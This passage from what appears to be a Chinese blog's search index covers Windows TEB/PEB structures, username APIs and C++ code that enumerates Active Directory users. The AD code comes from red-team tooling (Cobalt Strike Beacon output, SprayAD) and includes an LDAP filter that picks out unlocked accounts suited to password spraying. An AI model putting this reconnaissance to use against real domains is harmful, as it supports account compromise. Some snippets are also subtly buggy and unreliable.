_ACTIVATION_CONTEXT_DATA +0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP +0x318 MinimumStackCommit : Uint8B +0x320 SparePointers : [4] Ptr64 Void +0x340 SpareUlongs : [5] Uint4B +0x358 WerRegistrationData : Ptr64 Void +0x360 WerShipAssertPtr : Ptr64 Void +0x368 pUnused : Ptr64 Void +0x370 pImageHeaderHash : Ptr64 Void +0x378 TracingFlags : Uint4B +0x378 HeapTracingEnabled : Pos 0, 1 Bit +0x378 CritSecTracingEnabled : Pos 1, 1 Bit +0x378 LibLoaderTracingEnabled : Pos 2, 1 Bit +0x378 SpareTracingBits : Pos 3, 29 Bits +0x37c Padding6 : [4] UChar +0x380 CsrServerReadOnlySharedMemoryBase : Uint8B +0x388 TppWorkerpListLock : Uint8B +0x390 TppWorkerpList : _LIST_ENTRY +0x3a0 WaitOnAddressHashTable : [128] Ptr64 Void +0x7a0 TelemetryCoverageHeader : Ptr64 Void +0x7a8 CloudFileFlags : Uint4B +0x7ac CloudFileDiagFlags : Uint4B +0x7b0 PlaceholderCompatibilityMode : Char +0x7b1 PlaceholderCompatibilityModeReserved : [7] Char +0x7b8 LeapSecondData : Ptr64 _LEAP_SECOND_DATA +0x7c0 LeapSecondFlags : Uint4B +0x7c0 SixtySecondEnabled : Pos 0, 1 Bit +0x7c0 Reserved : Pos 1, 31 Bits +0x7c4 NtGlobalFlag2 : Uint4B","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】TEB (线程环境块)","date":"2024-01-23T06:08:14.123Z","path":"A_OS/Windows/【win】TEB(线程环境块)/","text":"概述：TEB（Thread Environment Block，线程环境块）指线程环境块，该结构体包含进程中运行线程的各种信息，进程中的每个线程都对应着一个TEB结构体。不同OS中TEB结构体的形态略微有点不同 微软官方文档： ‘线程环境块 (调试说明) - Win32 apps | Microsoft Learn ‘TEB (winternl.h) - Win32 apps | Microsoft Learn [toc] TEB 结构体定义MSDN123456789101112typedef struct _TEB &#123; PVOID Reserved1[12]; PPEB ProcessEnvironmentBlock; PVOID Reserved2[399]; BYTE Reserved3[1952]; PVOID TlsSlots[64]; BYTE Reserved4[8]; PVOID Reserved5[26]; PVOID ReservedForOle; PVOID Reserved6[4]; PVOID TlsExpansionSlots;&#125; TEB, *PTEB; Windows XP SP312345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667nt!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B +0x0ac UserReserved : [5] Uint4B +0x0c0 WOW32Reserved : Ptr32 Void +0x0c4 CurrentLocale : Uint4B +0x0c8 FpSoftwareStatusRegister : Uint4B +0x0cc SystemReserved1 : [54] Ptr32 Void +0x1a4 ExceptionCode : Int4B +0x1a8 ActivationContextStack : _ACTIVATION_CONTEXT_STACK +0x1bc SpareBytes1 : [24] UChar +0x1d4 GdiTebBatch : _GDI_TEB_BATCH +0x6b4 RealClientId : _CLIENT_ID +0x6bc GdiCachedProcessHandle : Ptr32 Void +0x6c0 GdiClientPID : Uint4B +0x6c4 GdiClientTID : Uint4B +0x6c8 GdiThreadLocalInfo : Ptr32 Void +0x6cc Win32ClientInfo : [62] Uint4B +0x7c4 glDispatchTable : [233] Ptr32 Void +0xb68 glReserved1 : [29] Uint4B +0xbdc glReserved2 : Ptr32 Void +0xbe0 glSectionInfo : Ptr32 Void +0xbe4 glSection : Ptr32 Void +0xbe8 glTable : Ptr32 Void +0xbec glCurrentRC : Ptr32 Void +0xbf0 glContext : Ptr32 Void +0xbf4 LastStatusValue : Uint4B +0xbf8 StaticUnicodeString : _UNICODE_STRING +0xc00 StaticUnicodeBuffer : [261] Uint2B +0xe0c DeallocationStack : Ptr32 Void +0xe10 TlsSlots : [64] Ptr32 Void +0xf10 TlsLinks : _LIST_ENTRY +0xf18 Vdm : Ptr32 Void +0xf1c ReservedForNtRpc : Ptr32 Void +0xf20 DbgSsReserved : [2] Ptr32 Void +0xf28 HardErrorsAreDisabled : Uint4B +0xf2c Instrumentation : [16] Ptr32 Void +0xf6c WinSockData : Ptr32 Void +0xf70 GdiBatchCount : Uint4B +0xf74 InDbgPrint : UChar +0xf75 FreeStackOnTermination : UChar +0xf76 HasFiberData : UChar +0xf77 IdealProcessor : UChar +0xf78 Spare3 : Uint4B +0xf7c ReservedForPerf : Ptr32 Void +0xf80 ReservedForOle : Ptr32 Void +0xf84 WaitingOnLoaderLock : Uint4B +0xf88 Wx86Thread : _Wx86ThreadState +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void +0xf98 ImpersonationLocale : Uint4B +0xf9c IsImpersonating : Uint4B +0xfa0 NlsCache : Ptr32 Void +0xfa4 pShimData : Ptr32 Void +0xfa8 HeapVirtualAffinity : Uint4B +0xfac CurrentTransactionHandle : Ptr32 Void +0xfb0 ActiveFrame : Ptr32 _TEB_ACTIVE_FRAME +0xfb4 SafeThunkCall : UChar +0xfb5 BooleanSpare : [3] UChar 各变量说明“_TEB” 是一个Windows内核对象的结构体，用于描述一个线程的状态和信息。它包含了线程的一些基本信息，例如线程的堆栈指针、环境变量、堆栈大小等。以下是 “_TEB” 结构体中的一些常用变量及其说明： *NtTeb: 指向当前线程的 “_TEB” 结构体的指针。 StackBase: 指向线程的堆栈起始地址。 StackLimit: 指向线程的堆栈结束地址。 StackReserveSize: 指定线程的堆栈大小。 EnvironmentPointer: 指向线程的环境变量的指针。 ThreadLocalStoragePointer: 指向线程的线程局部存储空间的指针。 *ProcessEnvironmentBlock: 指向进程的环境变量的指针。 BasePriority: 指定线程的优先级。 UniqueThreadID: 指定线程的唯一ID。 IdealProcessor: 指定线程的理想处理器。 IdealProcessorGroup: 指定线程的理想处理器组。 ThreadLocale: 指定线程的本地化信息。 ActiveStackAddress: 指向线程当前活跃的堆栈地址。 TlsSlots: 指向线程的线程局部存储空间的指针数组。 TlsExpansionSlots: 指定线程的线程局部存储空间的扩展槽数量。 Reserved: 保留字段。 Reserved2: 保留字段。 这些变量可以用于查看和分析线程的状态和信息。您可以使用Windows调试工具中的 “dt” 命令查看这些变量的值和相关信息，例如： 1dt nt!_TEB &lt;teb_object&gt; 其中 ““ 是线程的 “_TEB” 结构体的实例，例如 “fffffa800cd85b00”。这将显示线程的名称、大小、当前线程等信息。您可以根据需要进一步查看和分析这些信息。 重要成员在用户模式调试中起着重要作用的成员有2个，如下： 123+0x000 NtTib : _NT_TIB………………………………………………………………………………+0x030 ProcessEnvironmentBlock : Ptr32 _PEB ProcessEnvironmentBlock成员：先看Offset 30处的ProcessEnvironmentBlock成员，它是指向PEB（Process Environment Block，进程环境块）结构体指针。PEB是进程环境块，每个进程对应1个PEB结构体。 NtTib成员TEB结构体的第一个成员为_NT_TIB结构体（TIB是Thread Information Block的简称，意为“线程信息块”），_NT_TIB结构体的定义如下所示： 123456789101112131415typedef struct _NT_TIB //sizeof 1ch&#123; 00h struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; //SEH链入口 04h PVOID StackBase; //堆栈基址 08h PVOID StackLimit; //堆栈大小 0ch PVOID SubSystemTib; union &#123; PVOID FiberData; 10h DWORD Version; &#125;; 14h PVOID ArbitraryUserPointer; 18h struct _NT_TIB *Self; //本NT_TIB结构自身的线性地址&#125;NT_TIB; typedef NT_TIB *PNT_TIB; ExceptionList成员指向_EXCEPTION_REGISTRATION_RECORD结构体组成的链表，它用于Windows OS的SEH。Self成员是_NT_TIB结构体的自引用指针，也是TEB结构体的指针（因为TEB结构体的第一个成员就是_NT_TIB结构体）。那么我们如何在用户模式下访问到TEB结构体呢？只有访问它才能使用相应信息。","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】CreateProcess 过程详解","date":"2024-01-23T06:08:14.115Z","path":"A_OS/Windows/【win】CreateProcess/","text":"概述：windows CreateProcess 调用过程详解 CreateProcess 内部实现-CSDN博客","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【AD】AD域","date":"2024-01-23T06:07:44.305Z","path":"A_OS/Windows/AD/【AD】域/","text":"AD域定义及描述 AD域AD域（Active Directory Domain）是一种Windows Server的组织单元，用于管理计算机、用户、组织和其他资源。它提供了一种集中式的管理方式，可以让管理员轻松地管理网络中的资源。AD域支持以下功能： 用户和计算机管理：可以使用AD域来管理网络中的用户和计算机，包括创建、删除、修改用户和计算机的属性等。 组织管理：可以使用AD域来管理网络中的组织，包括创建、删除、修改组织的属性等。 权限管理：可以使用AD域来管理网络中的权限，包括授予用户访问资源的权限等。 网络服务管理：可以使用AD域来管理网络中的服务，包括打印服务、邮件服务等。 数据备份和恢复：可以使用AD域来备份和恢复网络中的数据，以防止数据丢失。","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"http://example.com/categories/A-OS/Windows/AD/"}]},{"title":"【WINAPI】获取系统当前用户名","date":"2024-01-22T16:00:00.000Z","path":"A_OS/Windows/API/【WINAPI】获取系统当前用户名/","text":"概述：windows 操作系统获取系统当前登录的用户 0x01 API查询结果总结以域名为domain，系统当前登录用户名为 test 为例举例说明，设备名为 WIN-FEKV0FJ89UQ API 用户态进程 服务进程 GetUserName test SYSTEM GetEnvironmentVariable(获取环境变量 %USERNAME%) test WIN-FEKV0FJ89UQ$ WTSQuerySessionInformation(不指定sessionid) test 服务进程中会返回空 WTSQuerySessionInformation(指定sessionid为WTSGetActiveConsoleSessionId()) test test GetUserNameExA test(返回形式依据传入的参数1) domain\\WIN-FEKV0FJ89UQ 总结下来，如果要获取系统当前登录的用户名，那么不管是在用户进程还是服务进程，使用 WTSQuerySessionInformation 指定 Sessionid 的方法比较靠谱。 0x02 获取用户的APIGetUserNameGetUserName以其运行的exe为主，用户态进程下获取的系统当前登录的用户名，服务进程中获取的为 system 用户。 1234567std::string GetLoginUsernameByApi()&#123; char username[1024]; DWORD usernameLength = sizeof username; GetUserName(username, &amp;usernameLength); return username;&#125; 通过环境变量获取%USERNAME% 和 GetUserName 本质上一致，不同的是，服务进程中，%USERNAME% 字段保存的是主机名+&amp;，只有用户态进程下才是当前系统登录用户名 123456std::string getLoginUsernameByEnv()&#123; char username[1024]; GetEnvironmentVariable(&quot;USERNAME&quot;, username, sizeof username); return username;&#125; WTSQuerySessionInformation 通过会话查询用户名12345678910std::string getLoginUsernameBySession()&#123; LPWSTR usernameBuffer = NULL; DWORD infoSize = 0; WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, WTS_INFO_CLASS::WTSUserName, &amp;usernameBuffer, &amp;infoSize); string username(usernameBuffer); return username;&#125; GetUserNameExA1234567891011121314151617181920212223242526272829 BOOL GetNameEx()&#123; // 获取当前登录用户的域信息 PCHAR cpuName = new CHAR[256]; PCHAR domainName = new CHAR[256]; DWORD domainNameSize = 0; ZeroMemory(domainName, 256); GetComputerObjectNameA(NameSamCompatible, NULL, &amp;domainNameSize); if (GetComputerObjectNameA(NameSamCompatible, cpuName, &amp;domainNameSize)) &#123; std::wcout &lt;&lt; &quot;当前登录的域机器: &quot; &lt;&lt; cpuName &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;无法获取域信息&quot; &lt;&lt; std::endl; &#125; domainNameSize = 0; GetUserNameExA(NameDisplay, NULL, &amp;domainNameSize); if (GetUserNameExA(NameDisplay, domainName, &amp;domainNameSize)) &#123; std::wcout &lt;&lt; &quot;当前登录的域用户: &quot; &lt;&lt; domainName &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;无法获取域信息&quot; &lt;&lt; std::endl; &#125;&#125; 0x03 如何在服务进程中获取系统当前登录的用户获取当前控制台会话ID，然后再调用 WTSQuerySessionInformationW 查询用户名。 123456789101112131415161718BOOL GetLocalCurUserName(std::wstring&amp; strUserName)&#123; BOOL bRet = FALSE; DWORD sessionId = WTSGetActiveConsoleSessionId(); LPWSTR ppBuffer[100]; DWORD bufferSize; bRet = WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSUserName, ppBuffer, &amp;bufferSize); printf(&quot; GetLocal1CurUserName --&gt; %s&quot;, *ppBuffer); if (bRet == TRUE) &#123; strUserName = *ppBuffer; WTSFreeMemory(ppBuffer); &#125; return bRet;&#125; 0x04 其他方式上述指定 Sessionid 的方法也可以通过 ProcessIdToSessionId 来获取 Sessionid。思路就是获取进程 Explorer.exe 的进程id，然后通过 PID 获取 Sessionid，最后通过 WTSQuerySessionInformationW 获取到对应的用户名。 12345678910111213141516171819202122232425262728293031323334DWORD GetPorceeIdByName(const std::string&amp; procName)&#123; const char* FindExe = procName.c_str(); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == hSnapshot) &#123; return NULL; &#125; PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;; for (BOOL ret = Process32First(hSnapshot, &amp;pe); ret; ret = Process32Next(hSnapshot, &amp;pe)) &#123; if (strcmp(pe.szExeFile, FindExe) == 0) &#123; CloseHandle(hSnapshot); return pe.th32ProcessID; &#125; //printf(&quot;%-6d %s\\n&quot;, pe.th32ProcessID, pe.szExeFile); &#125; CloseHandle(hSnapshot);&#125;bool GetUserNameByPid(DWORD pid, std::wstring&amp; username)&#123; DWORD SessionId; ProcessIdToSessionId(pid, &amp;SessionId); LPWSTR usernameBuffer = NULL; DWORD infoSize = 0; if (FALSE == WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, SessionId, WTS_INFO_CLASS::WTSUserName, &amp;usernameBuffer, &amp;infoSize)) &#123; return false; &#125; username = usernameBuffer; return true;&#125; 测试123456789101112void test()&#123; DWORD dwPid; wstring wsUserName; if (dwPid = GetPorceeIdByName(&quot;explorer.exe&quot;)) &#123; if (GetUserNameByPid(dwPid, wsUserName)) &#123; std::wcout &lt;&lt; &quot;explorer.exe:&quot; &lt;&lt; wsUserName &lt;&lt; endl; &#125; &#125;&#125;","tags":[{"name":"winapi","slug":"winapi","permalink":"http://example.com/tags/winapi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【AD】获取域用户信息","date":"2024-01-20T16:00:00.000Z","path":"A_OS/Windows/AD/【AD】获取域用户信息/","text":"概述：windows 环境下获取域用户信息 0x01 前言获取域用户信息首先需要一个登录到域环境中的账户，然后调用 IAds 和 IDirectorySearch 的相关接口执行查询和枚举即可。 【AD】用户属性 【AD】相关函数调用 【AD】RootDSE 微软相关文档： IADs 属性方法 (Iads.h) - Win32 apps | Microsoft Learn IDirectorySearch (iads.h) - Win32 apps | Microsoft Learn 0x02 函数与调用说明 打开默认的 rootDSE 获取 defaultNamingContext 字段名 调用 IAds 的 Get() 方法获取域的信息，字段名及获取的属性参考 RootDSE (AD 架构) - Win32 apps | Microsoft Learn 如果 defaultNamingContext 获取成功，则打开对应 LDAP (示例：LDAP://defaultNamingContext)，如果打开成功，就获取到了一个 IDirectorySearch 的对象 调用 IDirectorySearch::ExecuteSearch 执行查询，然后遍历查询出来的结果即可。 IDirectorySearch::ExecuteSearch 说明传入一个 LDAP 格式的搜索筛选器字符串，并传出一个 PADS_SEARCH_HANDLE 的句柄表示查询结果。 LDAP 格式的搜索字符串说明 类似于 SQL 语句，可以定义要查询的范围。书写格式参考文章：搜索筛选器语法 - Win32 apps | Microsoft Learn 1234// 一个 LDAP搜索字符串的示例// 如下所示表示只查询域内启用的用户LPCWSTR lpwFormat1 = L&quot;(&amp;(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime&gt;=1))(!(badPwdCount&gt;=%ls))(sAMAccountName=%ls))&quot;; // Only enabled accounts PADS_SEARCH_HANDLE 句柄 查询到结果后，需要调用 IDirectorySearch 的其他方法对结果进行枚举，ConvertColToUAStruct 为自定义封装的查询结果处理函数，参考 【AD】相关函数调用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 枚举查询结果的大致流程// Return specified propertieshr = pContainerToSearch-&gt;ExecuteSearch(wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &amp;hSearch);if (FAILED(hr)) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to execute search.\\n&quot;); goto CleanUp;&#125;if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row of data. hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; UserAccount userAct; userAct.strAccountType = L&quot;3&quot;; userAct.strDomain = pdcInfo-&gt;DomainName; userAct.strIsDomain = &quot;1&quot;; userAct.strPwdExpireTime = &quot;never&quot;; userAct.bAdmin = FALSE; // Keep track of count. iCount++; // Loop through the array of passed column names. while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; ConvertColToUAStruct(col, userAct); pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; if (pszColumn != NULL) &#123; FreeADsMem(pszColumn); &#125; &#125; Users.emplace_back(userAct); // Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch);&#125; 0x03 开源代码和项目QueryADUserholdyounger&#x2F;QueryADUser: 查询AD域内用户信息 查询逻辑基本一直，参考了 SprayAD 项目。另外添加了判断 域管理员 的逻辑，只有在域管理员的机器上才获取域内所有用户。 判断当前机器是否域管理员，参数1为 IDirectorySearch， 需要传入打来的 LDAP 句柄。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152BOOL IsDomainAdmin(_In_ IDirectorySearch* pContainerToSearch, _In_ LPCWSTR lpwFilterName)&#123; BOOL bRet = FALSE; HRESULT hr = S_OK; WCHAR wcSearchFilter[BUF_SIZE] = &#123; 0 &#125;; LPCWSTR pszAttrFilter[] = &#123; L&quot;isCriticalSystemObject&quot;, // boolean L&quot;sAMAccountName&quot;, // boolean &#125;; LPCWSTR lpwFormat = L&quot;(&amp;(objectClass=user)(objectCategory=person)((sAMAccountName=%ls)))&quot;; // Only enabled accounts // (!(userAccountControl:1.2.840.113556.1.4.803:=2)) PUSER_INFO pUserInfo = NULL; INT iCount = 0; DWORD x = 0L; LPWSTR pszColumn = NULL; IADs* pRoot = NULL; IID IADsIID; ADS_SEARCH_COLUMN col; DWORD dwAccountsFailed = 0; DWORD dwAccountsSuccess = 0; vector&lt;UserAccount&gt; uAccounts; _ADsOpenObject ADsOpenObject = (_ADsOpenObject) GetProcAddress(GetModuleHandleA(&quot;Activeds.dll&quot;), &quot;ADsOpenObject&quot;); if (ADsOpenObject == NULL) &#123; return S_FALSE; &#125; _FreeADsMem FreeADsMem = (_FreeADsMem) GetProcAddress(GetModuleHandleA(&quot;Activeds.dll&quot;), &quot;FreeADsMem&quot;); if (FreeADsMem == NULL) &#123; return S_FALSE; &#125; if (!pContainerToSearch) &#123; return E_POINTER; &#125; // Calculate Program run time. LARGE_INTEGER frequency; LARGE_INTEGER start; LARGE_INTEGER end; double interval; QueryPerformanceFrequency(&amp;frequency); QueryPerformanceCounter(&amp;start); // Specify subtree search ADS_SEARCHPREF_INFO SearchPrefs; SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE; SearchPrefs.vValue.dwType = ADSTYPE_INTEGER; SearchPrefs.vValue.Integer = 1000; DWORD dwNumPrefs = 1; // Handle used for searching ADS_SEARCH_HANDLE hSearch = NULL; // Set the search preference hr = pContainerToSearch-&gt;SetSearchPreference(&amp;SearchPrefs, dwNumPrefs); if (FAILED(hr)) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to set search preference.\\n&quot;); goto CleanUp; &#125; // Add the filter. if (lpwFilterName == NULL) &#123; // lpwFilter = L&quot;*&quot;; BeaconPrintf(CALLBACK_ERROR, &quot;Empty username!\\n&quot;); return hr; &#125; swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, lpwFilterName); pUserInfo = (PUSER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO)); if (pUserInfo == NULL) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to allocate UserInfo memory.\\n&quot;); goto CleanUp; &#125; // Return specified properties hr = pContainerToSearch-&gt;ExecuteSearch(wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &amp;hSearch); if (FAILED(hr)) &#123; BeaconPrintf(CALLBACK_ERROR, &quot;Failed to execute search.\\n&quot;); goto CleanUp; &#125; if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row of data. hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; UserAccount uAccount; // Keep track of count. iCount++; uAccount.bAdmin = FALSE; // Loop through the array of passed column names. while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; ConvertColToUAStruct(col, uAccount); pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; if (pszColumn != NULL) &#123; FreeADsMem(pszColumn); &#125; &#125; uAccounts.emplace_back(uAccount); // Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch); &#125; if (uAccounts.size() == 1) &#123; if (uAccounts[0].bAdmin == 1 &amp;&amp; uAccounts[0].UserName.CompareNoCase(&quot;Administrator&quot;) == 0) &#123; bRet = TRUE; &#125; &#125; if (SUCCEEDED(hr) &amp;&amp; 0 == iCount) &#123; hr = S_FALSE; &#125; if (dwAccountsSuccess == 0) &#123; BeaconPrintToStreamW(L&quot;[-] Failed =&gt; %ls\\\\%ls (Skip!)\\n&quot;, pdcInfo-&gt;DomainName, lpwFilterName); &#125;CleanUp: if (pUserInfo != NULL) &#123; HeapFree(GetProcessHeap(), 0, pUserInfo); &#125; return bRet;&#125; 测试： 获取当前登录用户名 12345678910111213141516BOOL GetCurUserName(CString &amp;strUserName)&#123; BOOL bRet = FALSE; char username[BUF_SIZE]; DWORD usernameSize = sizeof(username); if (FALSE == GetUserName(username, &amp;usernameSize)) &#123; goto End; &#125;; strUserName = username; bRet = TRUE; printf(&quot;gethostname result: %S \\n&quot;, username);End: return bRet;&#125; 1234567891011121314151617181920void test()&#123; if (IsDomainAdmin(pContainerToSearch, CStringW(&quot;Administrator&quot;))) &#123; &#125; CString DomainUserName; // 获取用户名 if (FALSE == GetCurUserName(DomainUserName)) &#123; &#125; if (IsDomainAdmin(pContainerToSearch, CStringW(userName))) &#123; &#125;&#125; QueryADObject.cpp来源：Homework-of-C-Language&#x2F;QueryADObject.cpp at e21cb129e15fd2186bd8ec1310bcc23c38ab209b · 3gstudent&#x2F;Homework-of-C-Language 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481//Reference://https://github.com/microsoft/Windows-classic-samples/tree/master/Samples/Win7Samples/netds/adsi/activedir/QueryUsers/vc//https://github.com/outflanknl/Recon-AD#include &lt;stdio.h&gt;#include &lt;objbase.h&gt;#include &lt;activeds.h&gt;#include &lt;sddl.h&gt;#pragma comment(lib, &quot;ADSIid.lib&quot;)#pragma comment(lib, &quot;ActiveDS.Lib&quot;)#pragma comment(lib, &quot;Ole32.Lib&quot;)#pragma comment(lib, &quot;Advapi32.Lib&quot;)#pragma comment(lib, &quot;oleaut32.Lib&quot;)int IS_BUFFER_ENOUGH(UINT maxAlloc, LPWSTR pszTarget, LPCWSTR pszSource, int toCopy = -1) &#123; if (toCopy == -1) &#123; toCopy = wcslen(pszSource); &#125; return maxAlloc - (wcslen(pszTarget) + toCopy + 1);&#125;HRESULT Search(IDirectorySearch *pContainerToSearch, // IDirectorySearch pointer to Partitions container. LPOLESTR szFilter, // Filter for finding specific crossrefs. NULL returns all attributeSchema objects. LPOLESTR *pszPropertiesToReturn, // Properties to return for crossRef objects found. NULL returns all set properties. BOOL bIsVerbose //TRUE means display all properties for the found objects are displayed. //FALSE means only the RDN )&#123; if (!pContainerToSearch) return E_POINTER; LPOLESTR pszNonVerboseList[] = &#123; L&quot;name&quot;,L&quot;distinguishedName&quot; &#125;; unsigned long ulNonVbPropsCount = 2; wprintf(L&quot;%s\\n&quot;, szFilter); // Specify subtree search ADS_SEARCHPREF_INFO SearchPrefs; SearchPrefs.dwSearchPref = ADS_SEARCHPREF_SEARCH_SCOPE; SearchPrefs.vValue.dwType = ADSTYPE_INTEGER; SearchPrefs.vValue.Integer = ADS_SCOPE_SUBTREE; DWORD dwNumPrefs = 1; // COL for iterations LPOLESTR pszColumn = NULL; ADS_SEARCH_COLUMN col; HRESULT hr; // Interface Pointers IADs *pObj = NULL; IADs *pIADs = NULL; // Handle used for searching ADS_SEARCH_HANDLE hSearch = NULL; // Set the search preference hr = pContainerToSearch-&gt;SetSearchPreference(&amp;SearchPrefs, dwNumPrefs); if (FAILED(hr)) &#123; return hr; &#125; LPOLESTR pszBool = NULL; DWORD dwBool; PSID pObjectSID = NULL; LPOLESTR szSID = NULL; LPOLESTR szDSGUID = new WCHAR[39]; LPGUID pObjectGUID = NULL; FILETIME filetime; SYSTEMTIME systemtime; DATE date; VARIANT varDate; LARGE_INTEGER liValue; LPOLESTR *pszPropertyList = NULL; int iCount = 0; DWORD x = 0L; if (!bIsVerbose) &#123; //Return non-verbose list properties only hr = pContainerToSearch-&gt;ExecuteSearch(szFilter, pszNonVerboseList, ulNonVbPropsCount, &amp;hSearch ); &#125; else &#123; if (!pszPropertiesToReturn) &#123; // Return all properties. hr = pContainerToSearch-&gt;ExecuteSearch(szFilter, NULL, -1L, &amp;hSearch); &#125; else &#123; // Specified subset. pszPropertyList = pszPropertiesToReturn; // Return specified properties hr = pContainerToSearch-&gt;ExecuteSearch(szFilter, pszPropertyList, sizeof(pszPropertyList) / sizeof(LPOLESTR), &amp;hSearch); &#125; &#125; if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row of data hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; // Keep track of count. iCount++; wprintf(L&quot;--------------------------------------------------------------------\\n&quot;); // Loop through the array of passed column names, print the data for each column while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; // Print the data for the column and free the column // Get the data for this column wprintf(L&quot;[+] %s:\\n&quot;, col.pszAttrName); switch (col.dwADsType) &#123; case ADSTYPE_DN_STRING: for (x = 0; x&lt; col.dwNumValues; x++) &#123; if (wcscmp(L&quot;member&quot;, col.pszAttrName) == 0) &#123; IADsNameTranslate *pNto; BSTR bstr; hr = CoCreateInstance(CLSID_NameTranslate, NULL, CLSCTX_INPROC_SERVER, IID_IADsNameTranslate, (void**)&amp;pNto); if (SUCCEEDED(hr)) &#123; hr = pNto-&gt;Set(ADS_NAME_TYPE_1779, col.pADsValues[x].DNString); if 